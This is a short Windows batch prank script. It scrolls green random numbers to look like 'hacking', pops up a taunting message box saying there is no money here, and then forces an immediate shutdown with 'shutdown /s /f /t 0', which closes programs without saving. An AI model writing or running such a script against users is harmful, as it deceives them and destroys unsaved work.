@echo off
color 02
:: Open Programs here
set loop=0
:loop
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
set /a loop=%loop%+1
if "%loop%"=="2000" goto l2
goto loop
:l2
TIMEOUT /t 5 >nul
echo x=msgbox("Sorry, no money here. GoodBye" ,48, "LOL Get dunked on") >> msgbox.vbs
start msgbox.vbs
TIMEOUT /t 5 >nul
shutdown /s /f /t 0